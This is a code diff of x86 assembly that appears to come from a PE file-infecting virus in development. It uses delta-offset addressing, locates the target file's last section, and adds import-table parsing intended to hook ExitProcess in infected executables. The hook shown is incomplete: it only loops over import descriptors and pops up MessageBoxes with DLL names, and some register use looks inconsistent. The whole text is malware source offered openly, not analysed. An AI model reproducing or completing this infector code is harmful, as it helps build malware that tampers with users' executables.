@@ -93,12 +93,23 @@ add	eax, 04h
 mov	esi, [eax]
 mov	[DELTA FileAlignment], esi
 
+; GET IAT Info for Hooking
+; Because when threading it will exit our main thread
+mov	edi, edx
+mov	ebx, [DELTA PeOptionalHeader]
+add	ebx, 060h ; DataDirectory
+mov	eax, IMAGE_DIRECTORY_ENTRY_IMPORT
+mov	ecx, sizeof (IMAGE_DATA_DIRECTORY)
+mul	ecx
+add	ebx, eax
+mov	ebx, [ebx] ; IMAGE_DIRECTORY_ENTRY_IMPORT IAT (VA)
+mov	[DELTA OffsetIAT], 0
+
 
 ; LOOP SECTIONS HEADER
-mov	esi, edx
+mov	esi, edi
 add	esi, 0F8h
 mov	[DELTA PeStartHeader], esi
-mov	ebx, esi ; Keep start of Headers
 mov	[DELTA LastSec], 0
 Loop_SectionHeader:
 ; GET LAST SECTION & CODE SECTION
@@ -121,5 +132,52 @@ jg	keepLastSec
 mov	[DELTA LastSecHeader], esi
 mov	[DELTA LastSec], eax
 keepLastSec:
+; CHECK IF SECTION IS IAT
+cmp	ebx, [eax]
+jl	notIAT
+cmp	ebx, edx
+jg	notIAT
+mov	edx, [eax]
+add	eax, 08h
+mov	eax, [eax]
+sub	edx, eax
+mov	[DELTA OffsetIAT], edx
+notIAT:
 add	esi, 028h
 loop	Loop_SectionHeader
+
+
+; IAT Hooking (ExitProcess)
+; Check if valid
+cmp	[DELTA OffsetIAT], 0
+je	doNotHook
+; Get IAT
+mov	edi, ebx ; VA IAT
+mov	eax, [DELTA OffsetIAT]
+sub	edi, eax
+mov	eax, [DELTA PeFileMap]
+add	edi, eax ; IAT
+
+; Iterate on all IAT
+iterateIAT:
+mov	edx, edi
+add	edx, 0Ch ; Dll Name
+mov	edx, [edx] ; VA
+cmp	edx, 0
+je	doNotHook
+add	edx, eax
+mov	ecx, [DELTA OffsetIAT]
+sub	edx, ecx
+
+pusha
+push	0
+push	edx
+push	edx
+push	0
+call	[DELTA pMessageBox]
+popa
+
+add	edi, sizeof (IMAGE_IMPORT_DESCRIPTOR)
+jmp	iterateIAT
+
+doNotHook:
